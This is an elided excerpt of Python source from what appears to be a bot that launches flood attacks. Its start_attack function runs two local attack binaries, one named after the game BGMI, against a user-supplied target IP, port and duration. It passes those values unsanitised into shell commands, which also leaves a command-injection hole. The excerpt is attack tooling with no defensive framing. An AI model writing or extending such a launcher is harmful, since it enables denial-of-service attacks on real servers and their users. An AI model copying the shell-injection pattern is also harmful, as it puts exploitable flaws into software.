...
ORIGINAL_DAKSH_PATH = '/workspaces/New1/sahil'    #ADD YOUR FILES PATH HERE 
...
def start_attack(user_id, target, port, duration):
    ...
    try:
        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 10 1000", shell=True)
        time.sleep(5)
        subprocess.run(f"./{daksh_file} {target} {port} {duration} 200", shell=True)
